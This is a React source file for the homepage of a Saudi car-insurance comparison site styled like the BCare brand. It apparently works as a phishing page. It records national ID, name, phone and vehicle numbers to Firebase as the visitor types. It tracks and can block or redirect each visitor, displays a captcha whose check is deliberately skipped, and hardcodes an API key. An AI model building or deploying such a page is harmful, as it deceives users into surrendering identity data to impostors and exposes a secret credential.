
import { useEffect, useState } from "react"
import { useLocation } from 'wouter'
import { Input } from "@/components/ui/input"
import { Globe, RefreshCw, Loader2, Car, HeartPulse, Stethoscope, Plane, User } from 'lucide-react'
import { FullPageLoader } from "@/components/loader"
import { getOrCreateVisitorID, initializeVisitorTracking, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { secureAddData as addData } from "@/lib/secure-firebase"
import { translations } from "@/lib/translations"
import { fetchVehiclesByNIN, vehiclesToDropdownOptions, saveSelectedVehicle, type VehicleDropdownOption } from "@/lib/vehicle-api"

function generateCaptcha() {
  return Math.floor(1000 + Math.random() * 9000).toString()
}

export default function HomePage() {
  const [, navigate] = useLocation()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)

  const [identityNumber, setidentityNumber] = useState("")
  const [ownerName, setOwnerName] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [documentType, setDocumentType] = useState("استمارة")
  const [serialNumber, setSerialNumber] = useState("")
  const [insuranceType, setInsuranceType] = useState("تأمين جديد")
  const [buyerName, setBuyerName] = useState("")
  const [buyerIdNumber, setBuyerIdNumber] = useState("")
  const [activeTab, setActiveTab] = useState("مركبات")
  const [captchaCode, setCaptchaCode] = useState(generateCaptcha())
  const [captchaInput, setCaptchaInput] = useState("")
  const [captchaError, setCaptchaError] = useState(false)

  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>([])
  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false)
  const [showVehicleDropdown, setShowVehicleDropdown] = useState(false)

  const [identityNumberError, setidentityNumberError] = useState("")
  const [language, setLanguage] = useState<"ar" | "en">("ar")

  useAutoSave({
    visitorId: visitorID,
    pageName: "home",
    data: {
      identityNumber,
      ownerName,
      phoneNumber,
      serialNumber,
      ...(insuranceType === "نقل ملكية" && { buyerName, buyerIdNumber })
    }
  })

  useRedirectMonitor({ visitorId: visitorID, currentPage: "home" })

  useEffect(() => {
    const init = async () => {
      try {
        // Add 3-second timeout for checkIfBlocked to avoid long loading
        const blocked = await Promise.race([
          checkIfBlocked(visitorID),
          new Promise<boolean>(resolve => setTimeout(() => resolve(false), 3000))
        ])
        if (blocked) { setIsBlocked(true); setLoading(false); return }
        // Show page immediately
        setLoading(false)
        // Run tracking in background (non-blocking)
        initializeVisitorTracking(visitorID).catch(console.error)
        updateVisitorPage(visitorID, "home", 1).catch(console.error)
        // Fetch country in background (non-blocking)
        if (!localStorage.getItem("country")) {
          setTimeout(async () => {
            try {
              const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
              const controller = new AbortController()
              const tid = setTimeout(() => controller.abort(), 5000)
              const response = await fetch(`https://api.ipdata.co/country_name?api-key=${APIKEY}`, { signal: controller.signal })
              clearTimeout(tid)
              if (response.ok) {
                const countryName = await response.text()
                const { countryNameToAlpha3 } = await import("@/lib/country-codes")
                const countryCode = countryNameToAlpha3(countryName)
                localStorage.setItem("country", countryCode)
                await addData({ id: visitorID, country: countryCode })
              }
            } catch (error) { console.error("Error fetching country:", error) }
          }, 200)
        }
      } catch (error) { console.error('Initialization error:', error); setLoading(false) }
    }
    init()
  }, [visitorID])

  useEffect(() => {
    const fetchVehicles = async () => {
      if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber)) {
        if (!validateSaudiId(identityNumber)) { setVehicleOptions([]); setShowVehicleDropdown(false); return }
        setIsLoadingVehicles(true); setVehicleOptions([]); setShowVehicleDropdown(false)
        try {
          const vehicles = await fetchVehiclesByNIN(identityNumber)
          if (vehicles && vehicles.length > 0) {
            const options = vehiclesToDropdownOptions(vehicles)
            setVehicleOptions(options); setShowVehicleDropdown(true)
          } else { setVehicleOptions([]); setShowVehicleDropdown(false) }
        } catch { setVehicleOptions([]); setShowVehicleDropdown(false) }
        finally { setIsLoadingVehicles(false) }
      } else { setVehicleOptions([]); setShowVehicleDropdown(false) }
    }
    fetchVehicles()
  }, [identityNumber])

  const refreshCaptcha = () => { setCaptchaCode(generateCaptcha()); setCaptchaInput(""); setCaptchaError(false) }

  const handlePhoneNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    if (cleaned.startsWith('05')) setPhoneNumber(cleaned.slice(0, 10))
    else if (cleaned.startsWith('5')) setPhoneNumber(cleaned.slice(0, 9))
    else setPhoneNumber(cleaned.slice(0, 10))
  }

  const handleIdentityNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    setidentityNumber(cleaned.slice(0, 10))
    if (identityNumberError) setidentityNumberError("")
  }

  const handleBuyerIdNumberChange = (value: string) => {
    setBuyerIdNumber(value.replace(/\D/g, '').slice(0, 10))
  }

  const handleSerialNumberChange = (value: string) => {
    setSerialNumber(value.replace(/\D/g, ''))
  }

  const handleVehicleSelect = (option: VehicleDropdownOption) => {
    setSerialNumber(option.value)
    saveSelectedVehicle(option)
    setShowVehicleDropdown(false)
  }

  const validateSaudiId = (id: string): boolean => {
    const cleanId = id.replace(/\s/g, "")
    if (!/^\d{10}$/.test(cleanId)) { setidentityNumberError(translations[language].identityMust10Digits); return false }
    if (!/^[12]/.test(cleanId)) { setidentityNumberError(translations[language].identityMustStartWith12); return false }
    let sum = 0
    for (let i = 0; i < 10; i++) {
      let digit = Number.parseInt(cleanId[i])
      if ((10 - i) % 2 === 0) { digit *= 2; if (digit > 9) digit -= 9 }
      sum += digit
    }
    if (sum % 10 !== 0) { setidentityNumberError(translations[language].invalidIdentityNumber); return false }
    setidentityNumberError(""); return true
  }

  const handleFirstStepSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!validateSaudiId(identityNumber)) return
    // Captcha is now optional - skip validation
    await addData({
      id: visitorID, identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType,
      ...(insuranceType === "نقل ملكية" && { buyerName, buyerIdNumber }),
      vehicleAutoFilled: vehicleOptions.length > 0,
      currentStep: 2, currentPage: "insur", homeCompletedAt: new Date().toISOString()
    }).then(() => navigate('/insur'))
  }

  if (loading) return <FullPageLoader />

  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    )
  }

  const tabs = [
    { ar: "مركبات", en: "Vehicles", icon: <Car className="w-5 h-5" /> },
    { ar: "طبي", en: "Medical", icon: <HeartPulse className="w-5 h-5" /> },
    { ar: "اخطاء طبية", en: "Med. Errors", icon: <Stethoscope className="w-5 h-5" /> },
    { ar: "سفر", en: "Travel", icon: <Plane className="w-5 h-5" /> },
  ]

  return (
    <div className="min-h-screen bg-[#0d5a7a] flex flex-col" dir={language === "ar" ? "rtl" : "ltr"}>

      {/* ─── Header ─── */}
      <header className="flex items-center justify-between px-4 py-3 md:px-8">
        {/* Logo */}
        <div className="flex items-center gap-2">
          <div className="w-9 h-9 rounded-full bg-[#0a4a68] border-2 border-yellow-400 flex items-center justify-center shadow">
            <span className="text-white font-bold text-base">B</span>
          </div>
          <span className="text-white font-bold text-lg tracking-wide">
            <span className="text-yellow-400">•</span>Care
          </span>
        </div>
        {/* Right side: lang + user icon */}
        <div className="flex items-center gap-3">
          <button
            onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
            className="flex items-center gap-1 px-3 py-1.5 bg-white/10 hover:bg-white/20 rounded-lg transition-colors text-white text-sm font-semibold"
          >
            <Globe className="w-4 h-4" />
            {language === "ar" ? "EN" : "AR"}
          </button>
          <div className="w-9 h-9 rounded-full bg-white/10 border border-white/30 flex items-center justify-center">
            <User className="w-5 h-5 text-white/80" />
          </div>
        </div>
      </header>

      {/* ─── Hero ─── */}
      <div className="relative px-4 pt-4 pb-16 md:pt-8 md:pb-24 text-center overflow-hidden">
        {/* Background icons */}
        <div className="absolute inset-0 pointer-events-none select-none opacity-10">
          <HeartPulse className="absolute top-6 left-6 w-12 h-12 text-white" />
          <Plane className="absolute top-4 right-8 w-10 h-10 text-white" />
          <Car className="absolute bottom-8 left-10 w-14 h-14 text-white" />
          <Stethoscope className="absolute bottom-6 right-6 w-12 h-12 text-white" />
          <User className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-20 h-20 text-white opacity-50" />
        </div>
        <h1 className="relative text-white text-2xl md:text-4xl font-bold leading-snug mb-3">
          {language === "ar"
            ? "المنصة الأذكى لمقارنة عروض تأمين السيارات في السعودية"
            : "The Smartest Platform to Compare Car Insurance in Saudi Arabia"}
        </h1>
        <p className="relative text-white/70 text-sm md:text-base max-w-xl mx-auto">
          {language === "ar"
            ? "المنصة الأذكى لمقارنة عروض أرخص تأمين. احصل على أرخص سيارات تأمين مع إصدار فوري وربط مباشر تنجم"
            : "Compare the cheapest insurance offers. Get instant issuance and direct integration with Najm."}
        </p>
      </div>

      {/* ─── Form Card ─── */}
      <div className="relative -mt-12 md:-mt-16 mx-auto w-full max-w-2xl px-3 pb-10">
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">

          {/* Tabs */}
          <div className="grid grid-cols-4 border-b border-gray-100">
            {tabs.map((tab) => (
              <button
                key={tab.ar}
                type="button"
                onClick={() => setActiveTab(tab.ar)}
                className={`flex flex-col items-center gap-1 py-3 md:py-4 text-xs md:text-sm font-semibold transition-all ${
                  activeTab === tab.ar
                    ? "text-[#0a4a68] border-b-2 border-yellow-400"
                    : "text-gray-400 hover:text-gray-600"
                }`}
              >
                <span className={activeTab === tab.ar ? "text-[#0a4a68]" : "text-gray-300"}>{tab.icon}</span>
                {language === "ar" ? tab.ar : tab.en}
              </button>
            ))}
          </div>

          {/* Form */}
          <form onSubmit={handleFirstStepSubmit} className="p-5 md:p-7 space-y-4" dir={language === "ar" ? "rtl" : "ltr"}>

            {/* Insurance Type */}
            <div>
              <label className="block text-sm font-semibold text-gray-600 mb-2">
                {language === "ar" ? "الغرض من التأمين" : "Insurance Purpose"}
              </label>
              <div className="grid grid-cols-2 gap-2">
                <button type="button" onClick={() => setInsuranceType("تأمين جديد")}
                  className={`py-2.5 rounded-xl font-semibold text-sm transition-all ${insuranceType === "تأمين جديد" ? "bg-[#0a4a68] text-white shadow" : "bg-gray-100 text-gray-600 hover:bg-gray-200"}`}>
                  {language === "ar" ? "تأمين جديد" : "New Insurance"}
                </button>
                <button type="button" onClick={() => setInsuranceType("نقل ملكية")}
                  className={`py-2.5 rounded-xl font-semibold text-sm transition-all ${insuranceType === "نقل ملكية" ? "bg-[#0a4a68] text-white shadow" : "bg-gray-100 text-gray-600 hover:bg-gray-200"}`}>
                  {language === "ar" ? "نقل ملكية" : "Ownership Transfer"}
                </button>
              </div>
            </div>

            {/* Identity Number */}
            <div>
              <label className="block text-sm font-semibold text-gray-600 mb-1.5">
                {language === "ar" ? "رقم الهوية / الإقامة" : "ID / Iqama Number"}
              </label>
              <Input
                type="tel" inputMode="numeric" pattern="[0-9]*"
                placeholder={language === "ar" ? "رقم الهوية / الإقامة" : "ID / Iqama Number"}
                value={identityNumber}
                onChange={(e) => handleIdentityNumberChange(e.target.value)}
                className={`h-11 text-right border rounded-xl focus:border-[#0a4a68] ${identityNumberError ? "border-red-400" : "border-gray-200"}`}
                dir="rtl" required
              />
              {identityNumberError && <p className="text-red-500 text-xs mt-1 text-right">{identityNumberError}</p>}
              {isLoadingVehicles && (
                <p className="text-blue-500 text-xs mt-1 flex items-center gap-1">
                  <Loader2 className="w-3 h-3 animate-spin" />
                  {language === "ar" ? "جاري جلب بيانات المركبات..." : "Fetching vehicle data..."}
                </p>
              )}
            </div>

            {/* Owner Name */}
            <div>
              <label className="block text-sm font-semibold text-gray-600 mb-1.5">
                {language === "ar" ? "الاسم" : "Full Name"}
              </label>
              <Input
                type="text"
                placeholder={language === "ar" ? "اسم مالك الوثيقة كاملاً" : "Full owner name"}
                value={ownerName}
                onChange={(e) => setOwnerName(e.target.value)}
                className="h-11 text-right border border-gray-200 rounded-xl focus:border-[#0a4a68]"
                dir={language === "ar" ? "rtl" : "ltr"} required
              />
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-sm font-semibold text-gray-600 mb-1.5">
                {language === "ar" ? "رقم الهاتف" : "Phone Number"}
              </label>
              <Input
                type="tel" inputMode="numeric" pattern="[0-9]*"
                placeholder={language === "ar" ? "رقم الهاتف" : "Phone Number"}
                value={phoneNumber}
                onChange={(e) => handlePhoneNumberChange(e.target.value)}
                className="h-11 text-right border border-gray-200 rounded-xl focus:border-[#0a4a68]"
                dir="rtl" required
              />
            </div>

            {/* Ownership Transfer Fields */}
            {insuranceType === "نقل ملكية" && (
              <>
                <div>
                  <label className="block text-sm font-semibold text-gray-600 mb-1.5">
                    {language === "ar" ? "اسم المشتري" : "Buyer Name"}
                  </label>
                  <Input type="text" placeholder={language === "ar" ? "اسم المشتري كاملاً" : "Full buyer name"}
                    value={buyerName} onChange={(e) => setBuyerName(e.target.value)}
                    className="h-11 text-right border border-gray-200 rounded-xl focus:border-[#0a4a68]"
                    dir={language === "ar" ? "rtl" : "ltr"} required />
                </div>
                <div>
                  <label className="block text-sm font-semibold text-gray-600 mb-1.5">
                    {language === "ar" ? "رقم هوية المشتري" : "Buyer ID Number"}
                  </label>
                  <Input type="tel" inputMode="numeric" placeholder={language === "ar" ? "رقم هوية المشتري" : "Buyer ID"}
                    value={buyerIdNumber} onChange={(e) => handleBuyerIdNumberChange(e.target.value)}
                    className="h-11 text-right border border-gray-200 rounded-xl focus:border-[#0a4a68]"
                    dir="rtl" required />
                </div>
              </>
            )}

            {/* Document Type */}
            <div>
              <label className="block text-sm font-semibold text-gray-600 mb-1.5">
                {language === "ar" ? "نوع تسجيل المركبة" : "Vehicle Registration Type"}
              </label>
              <div className="grid grid-cols-2 gap-2">
                <button type="button" onClick={() => setDocumentType("استمارة")}
                  className={`py-2.5 rounded-xl font-semibold text-sm transition-all ${documentType === "استمارة" ? "bg-[#0a4a68] text-white shadow" : "bg-gray-100 text-gray-600 hover:bg-gray-200"}`}>
                  {language === "ar" ? "استمارة" : "Registration"}
                </button>
                <button type="button" onClick={() => setDocumentType("بطاقة جمركية")}
                  className={`py-2.5 rounded-xl font-semibold text-sm transition-all ${documentType === "بطاقة جمركية" ? "bg-[#0a4a68] text-white shadow" : "bg-gray-100 text-gray-600 hover:bg-gray-200"}`}>
                  {language === "ar" ? "بطاقة جمركية" : "Customs Card"}
                </button>
              </div>
            </div>

            {/* Serial Number */}
            <div>
              <label className="block text-sm font-semibold text-gray-600 mb-1.5">
                {language === "ar" ? "الرقم التسلسلي" : "Serial Number"}
              </label>
              {showVehicleDropdown ? (
                <div className="space-y-1">
                  <select
                    value={serialNumber}
                    onChange={(e) => {
                      if (e.target.value === "OTHER") { setShowVehicleDropdown(false); setSerialNumber("") }
                      else {
                        const selected = vehicleOptions.find(opt => opt.value === e.target.value)
                        if (selected) handleVehicleSelect(selected)
                      }
                    }}
                    className="w-full h-11 text-right border border-gray-200 rounded-xl focus:border-[#0a4a68] bg-white px-3 text-sm"
                    dir="rtl" required
                  >
                    <option value="">{language === "ar" ? "اختر الرقم التسلسلي" : "Select serial number"}</option>
                    {vehicleOptions.map((option) => (
                      <option key={option.value} value={option.value}>{option.label}</option>
                    ))}
                    <option value="OTHER" className="font-bold text-blue-600">——— {language === "ar" ? "مركبة أخرى" : "Other vehicle"} ———</option>
                  </select>
                  <p className="text-xs text-green-600 flex items-center gap-1">
                    <span>✅</span> {language === "ar" ? `تم جلب ${vehicleOptions.length} مركبة` : `${vehicleOptions.length} vehicles found`}
                  </p>
                </div>
              ) : (
                <Input
                  type="tel" inputMode="numeric" pattern="[0-9]*"
                  placeholder={documentType === "بطاقة جمركية"
                    ? (language === "ar" ? "رقم البيان الجمركي" : "Customs Declaration Number")
                    : (language === "ar" ? "الرقم التسلسلي" : "Serial Number")}
                  value={serialNumber}
                  onChange={(e) => handleSerialNumberChange(e.target.value)}
                  className="h-11 text-right border border-gray-200 rounded-xl focus:border-[#0a4a68]"
                  dir="rtl" required
                />
              )}
            </div>

            {/* Captcha */}
            <div>
              <label className="block text-sm font-semibold text-gray-600 mb-1.5">
                {language === "ar" ? "رمز التحقق" : "Verification Code"}
              </label>
              <div className="flex items-center gap-2 border border-gray-200 rounded-xl p-2 bg-gray-50">
                <div className="flex items-center gap-1 bg-white px-2 py-1.5 rounded-lg shadow-sm" dir="ltr">
                  {captchaCode.split("").map((digit, index) => (
                    <span key={index} className={`text-2xl font-bold select-none ${
                      index === 0 ? "text-yellow-500" : index === 1 ? "text-blue-600" : index === 2 ? "text-green-600" : "text-green-500"
                    }`}>{digit}</span>
                  ))}
                  <button type="button" onClick={refreshCaptcha}
                    className="w-8 h-8 bg-blue-500 rounded-lg flex items-center justify-center hover:bg-blue-600 transition-colors ml-1">
                    <RefreshCw className="w-4 h-4 text-white" />
                  </button>
                </div>
                <Input
                  placeholder={language === "ar" ? "أدخل رمز التحقق" : "Enter code"}
                  value={captchaInput}
                  onChange={(e) => { setCaptchaInput(e.target.value); if (captchaError) setCaptchaError(false) }}
                  className={`flex-1 h-10 text-right border rounded-xl ${captchaError ? "border-red-400" : "border-gray-200"} focus:border-[#0a4a68]`}
                  dir="rtl" required
                />
              </div>
              {captchaError && (
                <p className="text-red-500 text-xs mt-1 text-right">
                  {language === "ar" ? "رمز التحقق غير صحيح" : "Incorrect verification code"}
                </p>
              )}
            </div>

            {/* Submit */}
            <button
              type="submit"
              className="w-full h-12 bg-[#0a4a68] hover:bg-[#083d57] text-white font-bold text-base rounded-xl shadow-lg hover:shadow-xl transition-all"
            >
              {language === "ar" ? "إظهار العروض" : "Show Offers"}
            </button>

          </form>
        </div>
      </div>

      {/* Footer */}
      <div className="mt-auto pb-6 text-center">
        <div className="flex items-center justify-center gap-4 text-white/50 text-xs">
          <a href="/privacy" className="hover:text-white/80 transition-colors">{language === "ar" ? "الخصوصية" : "Privacy"}</a>
          <span>·</span>
          <a href="/terms" className="hover:text-white/80 transition-colors">{language === "ar" ? "الشروط" : "Terms"}</a>
          <span>·</span>
          <a href="/cookies" className="hover:text-white/80 transition-colors">{language === "ar" ? "الكوكيز" : "Cookies"}</a>
        </div>
      </div>

    </div>
  )
}
